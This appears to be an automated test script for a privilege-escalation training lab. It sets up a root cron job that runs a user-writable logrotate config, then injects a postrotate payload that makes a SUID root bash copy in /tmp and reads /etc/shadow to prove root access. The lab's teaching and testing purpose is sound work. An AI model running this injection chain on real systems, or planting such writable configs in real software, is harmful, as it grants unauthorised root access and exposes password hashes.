#!/bin/bash
#
# Automated Test Script for Privilege Escalation Lab
# Scenario: Logrotate Configuration Injection → Root
#
# Must be run as root: sudo ./test_lab.sh
#

export PATH="/usr/sbin:/sbin:$PATH"

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Counters
PASS=0
FAIL=0

TEST_USER="developer"
TEST_PASS="developer123"

#######################################
# Logging functions
#######################################
log_header() {
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  $1${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
}

log_phase() {
    echo ""
    echo -e "${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ ${BOLD}$1${NC}"
    echo -e "${BLUE}└──────────────────────────────────────────────────────────────┘${NC}"
}

log_step() {
    echo -e "${YELLOW}  ► $1${NC}"
}

log_check() {
    echo -n "    [CHECK] $1 ... "
}

log_pass() {
    echo -e "${GREEN}✓ PASS${NC}"
    PASS=$((PASS + 1))
}

log_fail() {
    echo -e "${RED}✗ FAIL${NC}"
    echo -e "${RED}      Expected: $1${NC}"
    echo -e "${RED}      Got: $2${NC}"
    FAIL=$((FAIL + 1))
}

log_info() {
    echo -e "    ${CYAN}ℹ $1${NC}"
}

log_attack() {
    echo -e "    ${RED}⚔ $1${NC}"
}

#######################################
# Cleanup function
#######################################
cleanup() {
    log_phase "CLEANUP"

    pkill -u "$TEST_USER" 2>/dev/null || true
    userdel -r "$TEST_USER" 2>/dev/null || true

    rm -rf /etc/logrotate.d/apps 2>/dev/null || true
    rm -f /etc/cron.d/logrotate-apps 2>/dev/null || true
    rm -rf /var/log/webapp 2>/dev/null || true

    rm -f /tmp/rootbash 2>/dev/null || true
    rm -f /tmp/pwned.txt 2>/dev/null || true
    rm -f /root/pwned_by_developer 2>/dev/null || true

    log_info "Cleanup complete"
}

#######################################
# Pre-flight checks
#######################################
preflight() {
    log_phase "PRE-FLIGHT CHECKS"

    log_check "Running as root"
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}✗ FAIL${NC}"
        echo "This script must be run as root (sudo ./test_lab.sh)"
        exit 1
    fi
    log_pass

    log_check "logrotate available"
    if command -v logrotate &> /dev/null; then
        log_pass
    else
        log_fail "logrotate installed" "logrotate not found"
        exit 1
    fi

    log_step "Cleaning any previous test artifacts..."
    cleanup
}

#######################################
# PHASE 0: Setup environment
#######################################
phase_0() {
    log_phase "PHASE 0 — Environment Setup (Simulating Sysadmin)"

    log_step "Creating developer user..."
    useradd -m -s /bin/bash "$TEST_USER"
    echo "$TEST_USER:$TEST_PASS" | chpasswd

    log_check "Developer user created"
    if id "$TEST_USER" &>/dev/null; then
        log_pass
    else
        log_fail "user exists" "user not found"
    fi

    log_step "Creating application log directory..."
    mkdir -p /var/log/webapp
    touch /var/log/webapp/app.log
    chown -R "$TEST_USER:$TEST_USER" /var/log/webapp

    # Add content to log
    echo "[$(date)] Application started" >> /var/log/webapp/app.log

    log_step "Creating writable logrotate config directory..."
    mkdir -p /etc/logrotate.d/apps
    chown root:"$TEST_USER" /etc/logrotate.d/apps
    chmod 775 /etc/logrotate.d/apps

    log_check "Config directory group-writable"
    if [[ -w /etc/logrotate.d/apps ]]; then
        log_pass
    else
        log_fail "writable" "not writable"
    fi

    log_step "Creating base logrotate config..."
    cat > /etc/logrotate.d/apps/webapp << 'EOF'
/var/log/webapp/*.log {
    size 1
    rotate 7
    compress
    missingok
    notifempty
    create 644 developer developer
    postrotate
        /bin/true
    endscript
}
EOF
    chown "$TEST_USER:$TEST_USER" /etc/logrotate.d/apps/webapp
    chmod 644 /etc/logrotate.d/apps/webapp

    log_step "Creating cron job..."
    echo "*/5 * * * * root /usr/sbin/logrotate /etc/logrotate.d/apps/webapp" > /etc/cron.d/logrotate-apps
    chmod 644 /etc/cron.d/logrotate-apps

    log_info "Environment setup complete"
    log_info "Trust boundary: root runs logrotate on developer-controlled config"
}

#######################################
# PHASE 1: Verify attacker has no privileges
#######################################
phase_1() {
    log_phase "PHASE 1 — Verify Attacker Starts Unprivileged"

    log_check "Developer has no sudo access"
    SUDO_CHECK=$(su - "$TEST_USER" -c 'sudo -l' 2>&1 || true)
    if echo "$SUDO_CHECK" | grep -qi "may not run sudo\|not in the sudoers\|not allowed"; then
        log_pass
    else
        log_fail "no sudo" "$SUDO_CHECK"
    fi

    log_check "Developer CAN write to logrotate config directory"
    su - "$TEST_USER" -c 'touch /etc/logrotate.d/apps/test && rm /etc/logrotate.d/apps/test'
    if [[ $? -eq 0 ]]; then
        log_pass
    else
        log_fail "write access" "no write access"
    fi

    log_info "Attacker can write to logrotate config but has no root access"
}

#######################################
# PHASE 2: Attacker enumeration
#######################################
phase_2() {
    log_phase "PHASE 2 — Attacker Enumeration"

    log_step "Attacker finds writable config directories..."

    log_check "Attacker finds /etc/logrotate.d/apps"
    FIND_RESULT=$(su - "$TEST_USER" -c 'find /etc -type d -writable 2>/dev/null' || true)
    if echo "$FIND_RESULT" | grep -q "logrotate"; then
        log_pass
    else
        log_fail "logrotate dir found" "$FIND_RESULT"
    fi

    log_check "Logrotate config has postrotate section"
    CONFIG_CONTENT=$(su - "$TEST_USER" -c 'cat /etc/logrotate.d/apps/webapp')
    if echo "$CONFIG_CONTENT" | grep -q "postrotate"; then
        log_pass
    else
        log_fail "postrotate found" "not found"
    fi

    log_check "Cron runs logrotate as root"
    CRON_CONTENT=$(su - "$TEST_USER" -c 'cat /etc/cron.d/logrotate-apps')
    if echo "$CRON_CONTENT" | grep -q "root"; then
        log_pass
    else
        log_fail "root in cron" "not root"
    fi

    log_info "Attacker identifies: root runs logrotate with user-controlled config"
}

#######################################
# PHASE 3: Exploitation
#######################################
phase_3() {
    log_phase "PHASE 3 — Exploitation"

    log_step "Attacker modifies logrotate configuration..."
    su - "$TEST_USER" -c 'cat > /etc/logrotate.d/apps/webapp << '\''EOF'\''
/var/log/webapp/*.log {
    size 1
    rotate 7
    compress
    missingok
    notifempty
    create 644 developer developer
    postrotate
        /bin/true
        cp /bin/bash /tmp/rootbash
        chmod 4755 /tmp/rootbash
        echo "Pwned at $(date)" > /tmp/pwned.txt
        chmod 644 /tmp/pwned.txt
    endscript
}
EOF'

    log_check "Malicious config created"
    if grep -q "rootbash" /etc/logrotate.d/apps/webapp; then
        log_pass
    else
        log_fail "payload in config" "not found"
    fi

    log_step "Ensuring log file has content to trigger rotation..."
    su - "$TEST_USER" -c 'echo "Trigger rotation" >> /var/log/webapp/app.log'

    log_info "Malicious postrotate script staged"
    log_attack "When root runs logrotate, postrotate executes as root"
}

#######################################
# PHASE 4: Trigger and verify
#######################################
phase_4() {
    log_phase "PHASE 4 — Root Executes Logrotate"

    log_step "Simulating cron execution (root runs logrotate)..."
    /usr/sbin/logrotate -f /etc/logrotate.d/apps/webapp 2>/dev/null || true

    log_check "/tmp/rootbash exists"
    if [[ -f /tmp/rootbash ]]; then
        log_pass
    else
        log_fail "file exists" "not found (postrotate did not execute)"
        return
    fi

    log_check "/tmp/rootbash owned by root"
    OWNER=$(stat -c '%U' /tmp/rootbash)
    if [[ "$OWNER" == "root" ]]; then
        log_pass
    else
        log_fail "root" "$OWNER"
    fi

    log_check "/tmp/rootbash has SUID bit"
    PERMS=$(stat -c '%a' /tmp/rootbash)
    if [[ "$PERMS" == "4755" ]]; then
        log_pass
    else
        log_fail "4755" "$PERMS"
    fi

    log_check "/tmp/pwned.txt created"
    if [[ -f /tmp/pwned.txt ]]; then
        log_pass
        log_info "Contents: $(cat /tmp/pwned.txt)"
    else
        log_fail "file exists" "not found"
    fi

    log_attack "SUID root shell created at /tmp/rootbash"
}

#######################################
# PHASE 5: Prove root access
#######################################
phase_5() {
    log_phase "PHASE 5 — Privilege Escalation Verification"

    if [[ ! -f /tmp/rootbash ]]; then
        log_info "Skipping — SUID shell was not created"
        return
    fi

    log_step "Attacker executes SUID shell..."

    log_check "Developer achieves euid=0 (root)"
    ID_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "id"' 2>&1)
    if echo "$ID_CHECK" | grep -q "euid=0"; then
        log_pass
        log_info "ID output: $ID_CHECK"
    else
        log_fail "euid=0(root)" "$ID_CHECK"
    fi

    log_check "Developer can read /etc/shadow"
    SHADOW_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "head -1 /etc/shadow"' 2>&1)
    if echo "$SHADOW_CHECK" | grep -q ":"; then
        log_pass
    else
        log_fail "shadow content" "$SHADOW_CHECK"
    fi

    echo ""
    log_attack "╔═══════════════════════════════════════════════════════════╗"
    log_attack "║         PRIVILEGE ESCALATION SUCCESSFUL                   ║"
    log_attack "║                                                           ║"
    log_attack "║   Started as:  developer (uid=1001)                       ║"
    log_attack "║   Achieved:    root (euid=0)                              ║"
    log_attack "║   Method:      Logrotate Configuration Injection          ║"
    log_attack "╚═══════════════════════════════════════════════════════════╝"
}

#######################################
# Summary
#######################################
summary() {
    log_header "TEST SUMMARY"

    echo ""
    echo -e "  Tests passed: ${GREEN}${BOLD}$PASS${NC}"
    echo -e "  Tests failed: ${RED}${BOLD}$FAIL${NC}"
    echo ""

    if [[ $FAIL -eq 0 ]]; then
        echo -e "${GREEN}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}${BOLD}  ║           ALL TESTS PASSED — LAB IS FUNCTIONAL            ║${NC}"
        echo -e "${GREEN}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "  The lab correctly demonstrates:"
        echo "    1. Developer with write access to logrotate config"
        echo "    2. Root running logrotate with user config"
        echo "    3. Postrotate script injection"
        echo "    4. Privilege escalation from developer to root"
        echo ""
        echo "  Attack chain:"
        echo "    developer → logrotate postrotate injection → root (euid=0)"
        echo ""
    else
        echo -e "${RED}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}  ║              SOME TESTS FAILED — REVIEW OUTPUT            ║${NC}"
        echo -e "${RED}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
    fi
}

#######################################
# Main
#######################################
main() {
    log_header "Privilege Escalation Lab — Automated Test"
    echo ""
    echo "  Scenario: Application Log Management"
    echo "  Attack:   Logrotate Configuration Injection"
    echo "  Goal:     developer → root (euid=0)"

    trap cleanup EXIT

    preflight
    phase_0
    phase_1
    phase_2
    phase_3
    phase_4
    phase_5
    summary
}

main "$@"
